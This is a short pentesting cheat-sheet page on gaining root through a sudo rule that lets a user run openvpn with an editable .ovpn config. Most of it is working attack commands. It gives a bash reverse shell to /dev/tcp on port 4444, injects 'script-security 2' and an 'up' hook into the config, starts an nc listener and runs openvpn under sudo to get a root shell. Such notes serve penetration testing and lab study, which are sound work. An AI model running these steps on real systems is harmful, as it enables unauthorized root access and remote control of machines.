---
title: Sudo OpenVPN Privilege Escalation
description: Sudo openvpn may be vulnerable to privilege escalation.
tags:
    - Privilege Escalation
ref:
date: 2023-02-17
draft: false
---

## Investigation

```bash
(root) /usr/sbin/openvpn /opt/example.ovpn
```

If we can execute **`openvpn`** command as root and we have a **permission of editing** the **`.ovpn`** file, we can escalate to privilege.

<br />

## Exploitation

### 1. Create a Payload

First create a shell script to reverse shell. For example, create **`/tmp/shell.sh`**.  
Replace **`<local-ip>`** with your local ip address.

```bash
#!/bin/bash

bash -i >& /dev/tcp/<local-ip>/4444 0>&1
```

Then change the file permission so that root can execute this script.

```bash
chmod +x /tmp/shell.sh
```

### 2. Edit .ovpn File

Next edit the **`.ovpn`** file.  
We need to add **"script-security 2"** and **"`up /tmp/shell.sh`"** into the header.

```bash
# /opt/example.ovpn
...
script-security 2
up /tmp/shell.sh

<ca>
-----BEGIN CERTIFICATE-----
...
```

### 3. Reverse Shell

In local machine, start a listener.

```bash
nc -lvnp 4444
```

Now execute `openvpn` command as root.

```bash
sudo /usr/sbin/openvpn /opt/example.ovpn
```

This command executes our **`shell.sh`**, so we should get a root shell.
